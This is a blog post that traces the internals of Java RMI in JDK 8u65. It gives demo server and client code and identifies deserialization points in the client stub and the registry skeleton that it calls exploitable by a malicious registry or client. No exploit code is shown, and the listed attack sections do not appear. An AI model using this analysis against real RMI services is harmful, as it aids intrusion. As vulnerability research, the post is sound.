<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Java-RMIIntroductionRMI is Remote Method Invocation, which offers a remote interface as Java’s RPC framework to the application. ProcedureThe procedure can be represented as the following graph.   Cod">
<meta property="og:type" content="article">
<meta property="og:title" content="Java RMI">
<meta property="og:url" content="http://example.com/2023/07/25/Java-RMI/index.html">
<meta property="og:site_name" content="P3ngu1nW">
<meta property="og:description" content="Java-RMIIntroductionRMI is Remote Method Invocation, which offers a remote interface as Java’s RPC framework to the application. ProcedureThe procedure can be represented as the following graph.   Cod">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725214559548.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725151305509.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725152250350.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725152426437.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725152736479.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725153520233.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725153014782.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725153904441.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725154045242.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725160827645.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161307946.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161419927.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161752767.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161939350.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725162312655.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725163213092.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725172347106.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725172621711.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725173616036.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725173700141.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725183512037.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725183846248.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725190510643.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725201609914.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725201645326.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725201741852.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203157578.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203233302.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203244581.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203253068.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203607163.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725204411479.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725205501306.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725205730837.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725210630202.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725210839708.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725211038114.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725211205647.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725212228180.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725213020333.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725213044448.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230726145135207.png">
<meta property="og:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230726150157036.png">
<meta property="article:published_time" content="2023-07-25T05:47:27.000Z">
<meta property="article:modified_time" content="2023-07-26T13:34:57.776Z">
<meta property="article:author" content="P3ngu1nW">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725214559548.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Java RMI</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/02/JNDI/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/25/Java-RPC/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/25/Java-RMI/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/25/Java-RMI/&text=Java RMI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/25/Java-RMI/&is_video=false&description=Java RMI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java RMI&body=Check out this article: http://example.com/2023/07/25/Java-RMI/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/25/Java-RMI/&name=Java RMI&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/25/Java-RMI/&t=Java RMI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-RMI"><span class="toc-number">1.</span> <span class="toc-text">Java-RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Procedure"><span class="toc-number">1.2.</span> <span class="toc-text">Procedure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Analysing"><span class="toc-number">1.3.</span> <span class="toc-text">Code Analysing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DEMO"><span class="toc-number">1.3.1.</span> <span class="toc-text">DEMO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Server"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Client"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Client</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-RemoteObj"><span class="toc-number">1.3.2.</span> <span class="toc-text">Create a RemoteObj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Register-the-RemoteObj"><span class="toc-number">1.3.3.</span> <span class="toc-text">Register the RemoteObj</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Create-a-Registry"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">Create a Registry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bind"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">bind</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Visit-Registry-to-fetch-the-RemoteObj"><span class="toc-number">1.3.4.</span> <span class="toc-text">Visit Registry to fetch the RemoteObj</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Client-View"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">From Client View</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Registry-View"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">From Registry View</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Call-Remote-Method"><span class="toc-number">1.3.5.</span> <span class="toc-text">Call Remote Method</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Client-View-1"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">From Client View</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Server-View"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">From Server View</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DGC"><span class="toc-number">1.3.6.</span> <span class="toc-text">DGC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack-Method"><span class="toc-number">1.4.</span> <span class="toc-text">Attack Method</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Client"><span class="toc-number">1.4.1.</span> <span class="toc-text">Attack Client</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Registry-attack-Client"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">Registry attack Client</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-attack-Client"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">Server attack Client</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Server"><span class="toc-number">1.4.2.</span> <span class="toc-text">Attack Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Registry"><span class="toc-number">1.4.3.</span> <span class="toc-text">Attack Registry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Java RMI
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">P3ngu1nW</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-25T05:47:27.000Z" class="dt-published" itemprop="datePublished">2023-07-25</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java-RMI"></a>Java-RMI</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>RMI is Remote Method Invocation, which offers a remote interface as Java’s RPC framework to the application.</p>
<h2 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h2><p>The procedure can be represented as the following graph.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725214559548.png" class title="image-20230725214559548">

<h2 id="Code-Analysing"><a href="#Code-Analysing" class="headerlink" title="Code Analysing"></a>Code Analysing</h2><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p>First, let’s write a RMI demo.</p>
<p>The java env is jdk8u65</p>
<h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RemoteObj</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String Keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RemoteObjImpl</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String Keywords)</span><span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> Keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RemoteServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argc)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RMIClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argc)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;Let&#x27;s go!&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Create-a-RemoteObj"><a href="#Create-a-RemoteObj" class="headerlink" title="Create a RemoteObj"></a>Create a RemoteObj</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br></pre></td></tr></table></figure>

<p>It seems a simple instantiation, but remember that we have extended the <code>UnicastRemoteObject</code>.</p>
<p>So let’s see what happened inside.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725151305509.png" class title="image-20230725151305509">

<p>Firstly, we come into the <code>UnicastRemoteObject#exportObject</code>.</p>
<p>We can see this method published a <code>Remote</code> obj on the server(port: 0 means a random port).</p>
<p>Here, the <code>UnicastServerRef</code> encapsulates various network information.</p>
<p>From my opinion, <code>UnicastServerRef</code> is something to deal with the stub while <code>LiveRef</code> is to deal with the Internet.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725152250350.png" class title="image-20230725152250350">

<p>Then, our object will be encapsulated into the <code>UnicastServerRef</code> too.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725152426437.png" class title="image-20230725152426437">

<p>Then, <code>UnicastServerRef</code> create a stub for the Object, and encapsulates the <code>impl</code> and <code>stub</code> and something into a whole <code>Target</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725152736479.png" class title="image-20230725152736479">

<p>Then follows another exportObject.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725153520233.png" class title="image-20230725153520233">

<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725153014782.png" class title="image-20230725153014782">

<p>Finally, the server will listen to the port and handle the requests.</p>
<p>At last, there is a another <code>exportObject</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725153904441.png" class title="image-20230725153904441">

<p>Let’s see what’s in the <code>ObjectTable.putTarget</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725154045242.png" class title="image-20230725154045242">

<p>The target will finally be put into the <code>objTable</code> and <code>implTable</code></p>
<p>That means we can lookup the target by <code>ObjectEndpoint</code> or <code>Implementation</code></p>
<h3 id="Register-the-RemoteObj"><a href="#Register-the-RemoteObj" class="headerlink" title="Register the RemoteObj"></a>Register the RemoteObj</h3><p>Actually, the <code>Target</code> has a random port, which is unfriendly to the client.</p>
<p>So we can create a registry on a specific port and bind the RemoteObj.</p>
<h4 id="Create-a-Registry"><a href="#Create-a-Registry" class="headerlink" title="Create a Registry"></a>Create a Registry</h4><p>First, let’s see how to create a registry.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725160827645.png" class title="image-20230725160827645">

<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161307946.png" class title="image-20230725161307946">

<p>First we create a <code>LiveRef</code> encapsulated with the network information.</p>
<p>Then we encapsulate the <code>LiveRef</code> into the <code>UnicastServerRef</code> and call the <code>setup</code> method.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161419927.png" class title="image-20230725161419927">

<p>where call the <code>UnicastServerRef#exportObject</code> again.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161752767.png" class title="image-20230725161752767">

<p>But this time, we enter into the <code>setSkeleton</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725161939350.png" class title="image-20230725161939350">

<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725162312655.png" class title="image-20230725162312655">

<p>Here we use reflection to create <code>RegistryImpl_Skel</code>, which implements every operation in register.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725163213092.png" class title="image-20230725163213092">

<p>and finally, the stub will be encapsulated as a <code>Target</code> and exported.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725172347106.png" class title="image-20230725172347106">

<p>But there are three stuff in the objTable.</p>
<p>Two are what we created, the other is DGC, distributed garbage-collection</p>
<h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725172621711.png" class title="image-20230725172621711">

<p>It’s very easy, just put the name and RemoteObj into the Hashtable.</p>
<h3 id="Visit-Registry-to-fetch-the-RemoteObj"><a href="#Visit-Registry-to-fetch-the-RemoteObj" class="headerlink" title="Visit Registry to fetch the RemoteObj"></a>Visit Registry to fetch the RemoteObj</h3><h4 id="From-Client-View"><a href="#From-Client-View" class="headerlink" title="From Client View"></a>From Client View</h4><p>What happened when the client try to connect the registry.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725173616036.png" class title="image-20230725173616036">

<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725173700141.png" class title="image-20230725173700141">

<p>Finally, we can find we create a proxy of the Registry.</p>
<p>Then let’s check about the <code>registry.lookup</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725183512037.png" class title="image-20230725183512037">

<p>Here, <strong>we get the Registry’s dynamic proxy Stub</strong>, and deserialize the return value.</p>
<p>In this decompiled file, we can’t make breakpoint, but we can still follow the program.</p>
<p>Follow the <code>invoke() —&gt; call.executeCall()</code></p>
<p>We can find a deserialize code here.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725183846248.png" class title="image-20230725183846248">

<p>That means, if the registry returns a a malicious class, it is possible to create a <strong>hidden</strong> deserialization vulnerability on the client.</p>
<p>And once the client call the <code>invoke</code>, it may cause the vulnerability.</p>
<h4 id="From-Registry-View"><a href="#From-Registry-View" class="headerlink" title="From Registry View"></a>From Registry View</h4><p>make a breakpoint in <code>Transport#serviceCall</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725190510643.png" class title="image-20230725190510643">

<p>We can see the Registry receives a stub, which includes a ref.</p>
<p>Then the <code>skel</code> will be put into the <code>disp</code> and call <code>disp.dispatch()</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725201609914.png" class title="image-20230725201609914">

<p>Then we go into the <code>oldDispatch</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725201645326.png" class title="image-20230725201645326">

<p>Following the <code>skel.dispatch()</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725201741852.png" class title="image-20230725201741852">

<p>op represents the client’s operation.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0-&gt;bind</span><br><span class="line">1-&gt;list</span><br><span class="line">2-&gt;lookup</span><br><span class="line">3-&gt;rebind</span><br><span class="line">4-&gt;unbind</span><br></pre></td></tr></table></figure>

<p>So, in <code>RegistryImpl_Skel#dispatch</code>, there are some case code block, and some of them are vulnerable, which means the hacker can attack the registry from client.</p>
<ul>
<li><p>bind</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203157578.png" class title="image-20230725203157578">
</li>
<li><p>lookup</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203233302.png" class title="image-20230725203233302">
</li>
<li><p>rebind</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203244581.png" class title="image-20230725203244581">
</li>
<li><p>unbind</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203253068.png" class title="image-20230725203253068"></li>
</ul>
<p>In our <code>lookup</code> request, it will finally go into the <code>lookup</code> method, and get the <code>RemoteObj</code> from <code>bindings</code>, and return a serialization value.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725203607163.png" class title="image-20230725203607163">

<h3 id="Call-Remote-Method"><a href="#Call-Remote-Method" class="headerlink" title="Call Remote Method"></a>Call Remote Method</h3><h4 id="From-Client-View-1"><a href="#From-Client-View-1" class="headerlink" title="From Client View"></a>From Client View</h4><p>We should remember that the remoteObj we received is a Proxy, so what happened when we called <code>remoteObj.sayHello</code> at the client side?</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725204411479.png" class title="image-20230725204411479">

<p>Following the code, we can find we finally called <code>UnicastRef#invoke</code> to call remote method.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725205501306.png" class title="image-20230725205501306">

<p>Here we serialize our parameters, and call a dangerous method <code>call.executeCall()</code></p>
<p>Besides, the <code>unmarkedshalValue</code> method here is also dangerous. Because it can <strong>Deserialize</strong> a malicious class.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725205730837.png" class title="image-20230725205730837">

